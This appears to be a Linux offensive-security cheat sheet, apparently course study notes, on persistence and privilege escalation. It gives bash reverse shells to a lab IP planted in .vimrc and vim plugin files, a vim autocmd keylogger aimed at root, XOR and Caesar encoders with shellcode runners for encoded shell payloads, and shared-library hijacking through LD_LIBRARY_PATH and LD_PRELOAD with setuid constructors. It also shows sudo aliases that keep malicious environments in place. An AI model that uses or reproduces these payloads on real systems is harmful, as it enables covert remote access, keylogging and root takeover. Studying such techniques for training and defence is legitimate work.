[vim code exec](#vim-code-exec)  
[vim autocmd](#vim-autocmd)  
[x0r c shellcode runner](#c-shellcode-runner-xor)  
[ceaser c shellcode runner](#c-shellcode-ceaser)  
[Shared Libraries (LD_LIBRARY_PATH)](#shared-libraries)  
[Shared Libraries (LD_PRELOAD)](#ld-preload)


## User Configuration files

.bash_profile - executed when logging in to the system initially. This happens when logging in to the machine itself, via a serial console or SSH.  
.bashrc - executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.  

### VIM editor
<a name="vim-code-exec"></a>
**Edit /home/user/.vimrc file to execute commands when VI(M) is started**  

ways to load code with VIM
1) Put code directly into .vimrc file (:echo "test" / :silent)
2) Place code in another file and then source it with :!source (:!source /home/user/.vimrunscript)
3) VIM plugin file located in .vim/plugin/file.vim


.vimrc file
```
:silent !source ~/.vimrunscript
```

Example .vimrunscript
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.237/8888 0>&1
```

Example .vim/plugin/plugin.vim
```bash
:! bash -i >& /dev/tcp/192.168.45.237/8888 0>&1
```

##### VIM Priv escalation

**On a Debian or similar system that does not persist the user's shell environment information when moving to a sudo context, we can add an alias to the user's .bashrc file**  

We need to do this so vim keeps loading the users .vimrc and vim/plugin files.

.bashrc file
this is helpful in restrictive environments where you can preserve enviornment variables or load plugin files etc

```
alias sudo="sudo -E"
```

##### VIM autocmd (keylogger)
<a name="vim-autocmd"></a>


Events:
VimEnter (entering VIM), 
VimLeave (leaving VIM), 
FileAppendPre (right before appending to a file), 
BufWritePost (after writing a change buffer to a file).


Make a file in .vim/plugin/settings.vim. **VIM allows if/else logic**.  This is a **CRUDE KEYLOGGER**

```bash
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```
<br><br>

##### C shell code runner 
<a name="c-shellcode-runner-xor"></a>
To compile either one of these below

```bash
gcc -o whatever.out whatever.c -z execstack
```

**This is a encoder file that XOR encodes c payload.**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] =
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x21\xda\xc0\xa8\x2d\xed\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
        char xor_key = 'J';
        int payload_length = (int) sizeof(buf);

        for (int i=0; i<payload_length; i++)
        {
                printf("\\x%02X",buf[i]^xor_key);
        }

        return 0;

}
```

<br>

**This is the shellcode runner that takes x0r encoded payload.**

<br>

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
        char xor_key = 'J';
        int arraysize = (int) sizeof(buf);
        for (int i=0; i<arraysize-1; i++)
        {
                buf[i] = buf[i]^xor_key;
        }
        int (*ret)() = (int(*)())buf;
        ret();
}
```

**ceaser cipher payload code**
<a name="c-shellcode-ceaser"></a>

```bash
#include <stdio.h>
#include <string.h>

void raw_byte_shift(unsigned char *buf, size_t len, int shift) {
    // Normalize the shift to be within the 0-255 range
    int normalized_shift = shift % 256;
    if (normalized_shift < 0) {
        normalized_shift += 256;
    }

    for (size_t i = 0; i < len; i++) {
        buf[i] = buf[i] + normalized_shift;
    }
}

// --- Main function to demonstrate usage ---
int main() {
  unsigned char buf[] =
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x21\xda\xc0\xa8\x2d\xed\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

    size_t len = sizeof(buf) - 1;

    // Define the shift key
    int key = 0x05; // Shift by 5 (decimal)
    int decryption_key = -0x05;

    printf("Original Data Length: %zu bytes\n", len);
    printf("Cipher Key: \\x%02X (%d decimal)\n\n", key, key);

    // --- Print Original Data ---
    printf("Original Hex:\n");
    for (size_t i = 0; i < len; i++) {
        printf("\\x%02X", buf[i]);
        if ((i + 1) % 14 == 0) printf("\n"); // Format into rows of 14 bytes
    }
    printf("\n\n");

    // Apply the shift
    raw_byte_shift(buf, len, key);

    // --- Print Encoded Data ---
    printf("--- Encoded Data ---\n");
    printf("Encoded Hex:\n");

    // Copy/paste friendly encoded array
    printf("unsigned char encoded_buf[] = \n");

    for (size_t i = 0; i < len; i++) {
        if (i % 14 == 0) printf("\"");
        printf("\\x%02X", buf[i]);
        if ((i + 1) % 14 == 0) printf("\"\n");
    }
    printf(";\n");


    printf("decrypted buf = \n");

    raw_byte_shift(buf, len, decryption_key);

    for (size_t i = 0; i < len; i++) {
        if (i % 14 == 0) printf("\"");
        printf("\\x%02X", buf[i]);
        if ((i + 1) % 14 == 0) printf("\"\n");
    }

    return 0;
}
```



**this is shellcode runner that taxes ceaser ciphered payloads**

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] =
"\x36\x04\x6F\x0E\x5D\x9E\xBB\x15\x4D\x8E\xDB\x52\x36\xCE"
"\x6F\x27\x46\x5F\x6F\x0C\x5F\x14\x0A\x4D\x8A\xC5\x7D\x56"
"\x6F\x0F\x46\x5E\x55\x6F\x2E\x5D\x9E\x6F\x07\x64\x6F\x06"
"\x63\x14\x0A\x4D\x8A\xC5\x7D\x40\x4D\x9C\x4D\xBE\x07\x05"
"\x26\xDF\xC5\xAD\x32\xF2\x56\x4D\x8E\xEB\x6F\x15\x5F\x6F"
"\x2F\x5D\x14\x0A\x5E\x4D\x8A\xC5\x7E\x2A\x4E\x04\xCE\x79"
"\x1D\x5C\x6F\x28\x5D\x6F\x05\x6F\x0A\x4D\x8E\xEC\x4D\x36"
"\xFB\x14\x0A\x5E\x5E\x64\x4D\x8A\xC5\x7E\xCC\x6F\x41\x5D"
"\x6F\x06\x64\x14\x0A\x63\x6F\x83\x5F\x14\x0A\x4D\x8A\xC5"
"\x7D\xF2\x04\xEB";

void raw_byte_shift(unsigned char *buf, size_t len, int shift) {
    // Normalize the shift to be within the 0-255 range
    int normalized_shift = shift % 256;
    if (normalized_shift < 0) {
        normalized_shift += 256;
    }

    for (size_t i = 0; i < len; i++) {
        // Shifting an unsigned char automatically handles the modulo 256 wraparound
        buf[i] = buf[i] + normalized_shift;
    }
}

int main (int argc, char **argv)
{
        int len = sizeof(buf);
        int decryption_key = -0x05;

        raw_byte_shift(buf, len, decryption_key);

        for (size_t i = 0; i < len; i++) {
        if (i % 14 == 0) printf("\"");
        printf("\\x%02X", buf[i]);
        if ((i + 1) % 14 == 0) printf("\"\n");
        }


        int (*ret)() = (int(*)())buf;
        ret();
}
```

### Shared Libraries ( Linux DLL )
<a name="shared-libraries"></a>


**SO load order**
`. Directories listed in the application's RPATH value  
2. Directories specified in the LD_LIBRARY_PATH environment variable.  
3. Directories listed in the application's RUNPATH value.  
4. Directories specified in __/etc/ld.so.conf__.  
5. System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and potentially others.  

<br>
Remember you need to set an alias in .bashrc to bring over environment variables sudo -E.
<br>

POC script to touch file /tmp/haxso.txt

To compile below script without MAP file:  
1) gcc -Wall -fPIC -c -o hax.o hax.c
2) gcc -shared -o libhax.so hax.o

To compile with versioning script (map file):  
1) gcc -Wall -fPIC -c -o hax.o hax.c
2) gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o

In the first command, we use the -Wall parameter, which gives more verbose warnings when compiling. The -fPIC option tells the compiler to use position independent code, which is suitable for shared libraries since they are loaded in unpredictable memory locations. The -c flag tells gcc to compile but not link the code and -o tells the compiler to produce an output file with the name immediately following the parameter. Finally, the last item is the source code file we've written.

In the second command, we're again using gcc to compile. However, this time we use the -shared parameter to tell gcc we're creating a shared library from our object file. We then specify an output file again, this time with the name libhax.so, and then we specify our input object file.
<br>
```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```
<br><br>
<img width="1083" height="328" alt="image" src="https://github.com/user-attachments/assets/f43b14f6-d139-48f3-b926-e7162bfbd911" />
<br><br>

**use ldd to investigate executables shared libraries**

Exploit that shared library via setting **LD_LIBRARY_PATH** rename our .so to the .so were poisoning
```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/
cp libhax.so libgpg-error.so.0
```

This can be added to .bashrc to make it automated.
```bash
alias top='LD_LIBRARY_PATH=/home/linuxvictim /usr/bin/top'
```
<br><br>

##### LD_LIBRARY_PATH dependency issues

<img width="838" height="141" alt="image" src="https://github.com/user-attachments/assets/5191027a-5d49-4f78-a821-d7d421d3f837" /><br>

This is due to dependency issues.  You can find the symbols that are loaded in the .so fie you replaced with **readelf**.  This command uses AWK and SED to extract and c signatures for our library.  

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
<br>

If you get a versioning issue like below  
top: /home/linuxvictim/libgpg-error.so.0: **no version information available** (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)  

Create a MAP file.  Same command as before exceot now were just printing the anmes to be put into a MAP file
```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
<br>

GPG.map file
```
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};
```

#### LD_PRELOAD  
<a name="ld-preload"></a>

LD_PRELOAD is an environment variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library **before** any others. As a result, functions that are defined in this library are used before any with the same method signature that are defined in other libraries.

Compiling LD_PRELOAD with GCC:

```bash
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

1) Find functions:
```bash
ltrace cp
```

<img width="830" height="277" alt="image" src="https://github.com/user-attachments/assets/cb1467b7-93d9-4eb5-86ae-096802b5b32d" />
<br>

Targetting "uid_t geteuid(void)" for this exploit.  

2) Make C program that calls that function and  overrides it.


```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>


//192.168.45.237:8666
unsigned char buf[] =
"\x36\x04\x6F\x0E\x5D\x9E\xBB\x15\x4D\x8E\xDB\x52\x36\xCE"
"\x6F\x27\x46\x5F\x6F\x0C\x5F\x14\x0A\x4D\x8A\xC5\x7D\x56"
"\x6F\x0F\x46\x5E\x55\x6F\x2E\x5D\x9E\x6F\x07\x64\x6F\x06"
"\x63\x14\x0A\x4D\x8A\xC5\x7D\x40\x4D\x9C\x4D\xBE\x07\x05"
"\x26\xDF\xC5\xAD\x32\xF2\x56\x4D\x8E\xEB\x6F\x15\x5F\x6F"
"\x2F\x5D\x14\x0A\x5E\x4D\x8A\xC5\x7E\x2A\x4E\x04\xCE\x79"
"\x1D\x5C\x6F\x28\x5D\x6F\x05\x6F\x0A\x4D\x8E\xEC\x4D\x36"
"\xFB\x14\x0A\x5E\x5E\x64\x4D\x8A\xC5\x7E\xCC\x6F\x41\x5D"
"\x6F\x06\x64\x14\x0A\x63\x6F\x83\x5F\x14\x0A\x4D\x8A\xC5"
"\x7D\xF2\x04\xEB";

void raw_byte_shift(unsigned char *buf, size_t len, int shift) {
    // Normalize the shift to be within the 0-255 range
    int normalized_shift = shift % 256;
    if (normalized_shift < 0) {
        normalized_shift += 256;
    }

    for (size_t i = 0; i < len; i++) {
        // Shifting an unsigned char automatically handles the modulo 256 wraparound
        buf[i] = buf[i] + normalized_shift;
    }
}

//Next, we use the dlsym function to get the memory address of the original version of the geteuid function. The dlsym function finds a symbol for a dynamic library in memory.
//
//        old_geteuid = dlsym(RTLD_NEXT, "geteuid");
//
uid_t geteuid(void)
{
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");
        raw_byte_shift(buf, sizeof(buf), -0x05);

       if (fork() == 0)
        {
                intptr_t pagesize = sysconf(_SC_PAGESIZE);
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                 pagesize, PROT_READ|PROT_EXEC)) {
                        perror("mprotect");
                        return -1;
                }
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                printf("HACK: returning from function...\n");
                return (*old_geteuid)();
        }
        printf("HACK: Returning from main...\n");
        return -2;
}

int main() {

}

```

3) Execute LD_PRELOAD

```bash
LD_PRELOAD=/home/offsec/evil_geteuid.so cp /etc/passwd .
```

<br>

if you set alias in .bashrc you can have sudo alias below
```bash
alias sudo='sudo LD_PRELOAD=/home/offsec/evil_geteuid.so'
```

